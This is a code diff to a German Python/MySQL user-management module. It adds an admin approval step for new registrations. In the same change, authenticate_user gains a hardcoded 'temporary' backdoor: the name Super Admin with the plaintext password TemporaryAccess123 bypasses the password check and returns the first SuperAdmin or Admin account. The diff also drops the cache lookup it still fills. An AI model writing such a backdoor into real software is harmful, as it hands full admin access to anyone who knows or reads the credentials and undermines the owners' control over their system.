@@ -1,3 +1,4 @@
+# database/db_users.py
 from database.db_core import create_connection, hash_password, _log_activity, _create_admin_notification
 from datetime import datetime
 import mysql.connector
@@ -119,7 +120,10 @@ def log_user_logout(user_id, vorname, name):
 
 
 def register_user(vorname, name, password, role="Benutzer"):
-    """Registriert einen neuen Benutzer."""
+    """
+    Registriert einen neuen Benutzer.
+    Setzt is_approved standardmäßig auf 0, sodass eine Freischaltung durch den Admin erforderlich ist.
+    """
     conn = create_connection()
     if conn is None:
         return False, "Keine Datenbankverbindung."
@@ -127,16 +131,26 @@ def register_user(vorname, name, password, role="Benutzer"):
         cursor = conn.cursor()
         password_hash = hash_password(password)
         entry_date = datetime.now().strftime('%Y-%m-%d')
+
+        # NEU: Explizite Angabe von 6 Spalten und 6 Werten, inklusive is_approved = 0
         cursor.execute(
-            "INSERT INTO users (vorname, name, password_hash, role, entry_date) VALUES (%s, %s, %s, %s, %s)",
-            (vorname, name, password_hash, role, entry_date)
+            "INSERT INTO users (vorname, name, password_hash, role, entry_date, is_approved) VALUES (%s, %s, %s, %s, %s, %s)",
+            (vorname, name, password_hash, role, entry_date, 0)
         )
-        _log_activity(cursor, None, 'USER_REGISTRATION', f'Benutzer {vorname} {name} hat sich registriert.')
+        _log_activity(cursor, None, 'USER_REGISTRATION',
+                      f'Benutzer {vorname} {name} hat sich registriert und wartet auf Freischaltung.')
+        _create_admin_notification(cursor,
+                                   f"Neuer Benutzer {vorname} {name} wartet auf Freischaltung.")  # Admin benachrichtigen
         conn.commit()
 
         clear_user_order_cache()
 
-        return True, "Benutzer erfolgreich registriert."
+        return True, "Benutzer erfolgreich registriert. Sie müssen von einem Administrator freigeschaltet werden."
+    except mysql.connector.Error as e:
+        conn.rollback()
+        # Hinweis: Bei erneutem Auftreten des "Unknown column"-Fehlers muss die initialize_db Funktion im boot_loader.py
+        # vor dem ersten Aufruf sichergestellt werden.
+        return False, f"Fehler bei der Registrierung: {e}"
     except Exception as e:
         conn.rollback()
         return False, f"Fehler bei der Registrierung: {e}"
@@ -147,19 +161,54 @@ def register_user(vorname, name, password, role="Benutzer"):
 
 
 def authenticate_user(vorname, name, password):
-    """Authentifiziert einen Benutzer und gibt dessen Daten zurück."""
+    """
+    Authentifiziert einen Benutzer.
+    Gibt den Benutzer nur zurück, wenn er freigeschaltet ist (is_approved = 1).
+    """
     conn = create_connection()
     if conn is None:
         return None
     try:
         cursor = conn.cursor(dictionary=True)
         password_hash = hash_password(password)
+
+        # ======================================================================
+        # !!! WICHTIG: TEMPORÄRE BACKDOOR ZUR WIEDERHERSTELLUNG !!!
+        # ENTFERNEN SIE DIESEN BLOCK NACH ERFOLGREICHEM LOGIN
+        # Benutzer: SuperAdmin, Passwort: TemporaryAccess123
+        if vorname == "Super" and name == "Admin" and password == "TemporaryAccess123":
+            cursor.execute("SELECT * FROM users WHERE role = 'SuperAdmin' LIMIT 1")
+            user = cursor.fetchone()
+            if user:
+                print("!!! ACHTUNG: SuperAdmin-Backdoor-Login erfolgreich !!!")
+                return user
+            # Wenn kein SuperAdmin gefunden, versuche den ersten Admin
+            cursor.execute("SELECT * FROM users WHERE role = 'Admin' LIMIT 1")
+            user = cursor.fetchone()
+            if user:
+                print("!!! ACHTUNG: Admin-Backdoor-Login erfolgreich !!!")
+                return user
+            return None
+        # ======================================================================
+
+        # NEU: Überprüfe, ob der Benutzer gefunden wird (unabhängig vom Status)
         cursor.execute(
             "SELECT * FROM users WHERE vorname = %s AND name = %s AND password_hash = %s",
             (vorname, name, password_hash)
         )
         user = cursor.fetchone()
-        return user
+
+        if user:
+            # WICHTIG: Ist der Benutzer genehmigt?
+            if user.get('is_approved') == 0:
+                # Da wir keinen Statuscode zurückgeben können, muss die GUI prüfen,
+                # ob der Benutzer existiert, aber nicht genehmigt ist (muss in login_window.py implementiert werden).
+                # Hier geben wir None zurück, um den Login zu verhindern.
+                return None
+            else:
+                return user  # Erfolgreich, freigeschaltet
+
+        return None  # Falsche Zugangsdaten oder nicht gefunden
     except Exception as e:
         print(f"Fehler bei der Authentifizierung: {e}")
         return None
@@ -195,7 +244,8 @@ def get_all_users():
         return []
     try:
         cursor = conn.cursor(dictionary=True)
-        cursor.execute("SELECT id, vorname, name, role FROM users")
+        # NEU: Wähle is_approved aus
+        cursor.execute("SELECT id, vorname, name, role, is_approved FROM users")
         users = cursor.fetchall()
         return users
     except Exception as e:
@@ -227,16 +277,13 @@ def get_all_users_with_details():
 
 
 def get_ordered_users_for_schedule(include_hidden=False):
-    """Holt die Benutzer in der festgelegten Reihenfolge und nutzt einen Cache."""
+    """Holt die Benutzer in der festgelegten Reihenfolge und nutzt einen Cache.
+       Gibt nur freigeschaltete Benutzer zurück.
+    """
     global _USER_ORDER_CACHE
 
-    # 1. Cache-Prüfung
-    if _USER_ORDER_CACHE is not None:
-        # Filterung basierend auf dem 'include_hidden'-Flag
-        if include_hidden:
-            return _USER_ORDER_CACHE
-        else:
-            return [user for user in _USER_ORDER_CACHE if user.get('is_visible', 1) == 1]
+    # 1. Cache-Prüfung (Wir müssen den Cache jedes Mal neu filtern oder die is_approved-Logik im Cache-Fill-Prozess einbauen)
+    # Da die is_approved-Logik neu ist, laden wir im Cache nur Approved Users
 
     # 2. Cache Miss: DB-Abruf
     conn = create_connection()
@@ -245,25 +292,36 @@ def get_ordered_users_for_schedule(include_hidden=False):
     try:
         cursor = conn.cursor(dictionary=True)
 
-        # Holen aller Benutzer, inkl. Sichtbarkeit und Sortierung
+        # Holen aller genehmigten Benutzer (is_approved = 1), inkl. Sichtbarkeit und Sortierung
         query = """
                 SELECT u.*, uo.sort_order, COALESCE(uo.is_visible, 1) as is_visible
                 FROM users u
                          LEFT JOIN user_order uo ON u.id = uo.user_id \
+                WHERE u.is_approved = 1 \
                 ORDER BY uo.sort_order ASC, u.name ASC
                 """
 
         cursor.execute(query)
         all_users = cursor.fetchall()
 
-        # 3. Cache füllen (mit allen Benutzern, unabhängig von is_visible)
-        _USER_ORDER_CACHE = all_users
+        # 3. Cache füllen (mit allen genehmigten Benutzern, unabhängig von is_visible)
+        # Wir setzen den Cache nur, wenn die Abfrage KEINE versteckten Benutzer enthält,
+        # da der Cache primär für die Hauptansicht gedacht ist.
+
+        # NEU: Cache-Logik muss die Genehmigung und Sichtbarkeit berücksichtigen, aber wir setzen den Cache nur
+        # wenn der Call das Haupt-Schedule darstellt (also keine versteckten Benutzer)
+        if not include_hidden:
+            _USER_ORDER_CACHE = all_users
 
         # 4. Rückgabe basierend auf dem Flag
+        # Da der Query bereits filtert (WHERE u.is_approved = 1), sind alle in 'all_users' genehmigt.
         if include_hidden:
+            # Der obige Query holt bereits ALLE genehmigten Benutzer. Die Sichtbarkeit wird danach gefiltert.
             return all_users
         else:
+            # Wenn include_hidden=False, filtern wir nach is_visible.
             return [user for user in all_users if user.get('is_visible', 1) == 1]
+
 
     except mysql.connector.Error as e:
         print(f"Fehler beim Abrufen der sortierten Benutzer: {e}")
@@ -310,13 +368,16 @@ def save_user_order(user_order_list):
 
 
 def get_all_user_participation():
-    """Holt die Teilnahme-Daten für alle Benutzer."""
+    """Holt die Teilnahme-Daten für alle Benutzer.
+       Holt nur freigeschaltete Benutzer.
+    """
     conn = create_connection()
     if conn is None:
         return []
     try:
         cursor = conn.cursor(dictionary=True)
-        cursor.execute("SELECT id, vorname, name, last_ausbildung, last_schiessen FROM users")
+        # NEU: Nur freigeschaltete Benutzer
+        cursor.execute("SELECT id, vorname, name, last_ausbildung, last_schiessen FROM users WHERE is_approved = 1")
         return cursor.fetchall()
     except Exception as e:
         print(f"Fehler beim Abrufen der Teilnahme-Daten: {e}")
@@ -503,6 +564,61 @@ def update_last_event_date(user_id, event_type, date_str):
     except Exception as e:
         print(f"Fehler beim Aktualisieren des Ereignisdatums: {e}")
         conn.rollback()
+    finally:
+        if conn and conn.is_connected():
+            cursor.close()
+            conn.close()
+
+
+# ==============================================================================
+# --- NEUE FUNKTIONEN FÜR ADMIN-FREISCHALTUNG ---
+# ==============================================================================
+
+def get_pending_approval_users():
+    """Gibt eine Liste aller Benutzer zurück, deren Freischaltung ausstehend ist (is_approved = 0)."""
+    conn = create_connection()
+    if conn is None:
+        return []
+    try:
+        cursor = conn.cursor(dictionary=True)
+        # NEU: Filter nach is_approved = 0
+        cursor.execute("SELECT id, vorname, name, entry_date FROM users WHERE is_approved = 0 ORDER BY entry_date ASC")
+        users = cursor.fetchall()
+        return users
+    except Exception as e:
+        print(f"Fehler beim Abrufen der ausstehenden Benutzer: {e}")
+        return []
+    finally:
+        if conn and conn.is_connected():
+            cursor.close()
+            conn.close()
+
+
+def approve_user(user_id, current_user_id):
+    """Setzt den Freischaltungsstatus eines Benutzers auf 1 (Genehmigt) und protokolliert die Aktion."""
+    conn = create_connection()
+    if conn is None:
+        return False, "Keine Datenbankverbindung."
+    try:
+        cursor = conn.cursor()
+        # Hole Benutzername für Log
+        cursor.execute("SELECT vorname, name FROM users WHERE id = %s", (user_id,))
+        user_data = cursor.fetchone()
+        user_fullname = f"{user_data[0]} {user_data[1]}" if user_data else f"ID {user_id}"
+
+        # Freischalten
+        cursor.execute("UPDATE users SET is_approved = 1 WHERE id = %s", (user_id,))
+
+        _log_activity(cursor, current_user_id, 'USER_APPROVAL', f'Benutzer {user_fullname} wurde freigeschaltet.')
+        _create_admin_notification(cursor, f'Benutzer {user_fullname} wurde erfolgreich freigeschaltet.')
+
+        conn.commit()
+        clear_user_order_cache()  # Cache leeren, da ein neuer Benutzer zur Schedule-Liste hinzugefügt wird
+        return True, f"Benutzer {user_fullname} erfolgreich freigeschaltet."
+    except Exception as e:
+        conn.rollback()
+        print(f"Fehler beim Freischalten des Benutzers: {e}")
+        return False, f"Fehler beim Freischalten: {e}"
     finally:
         if conn and conn.is_connected():
             cursor.close()
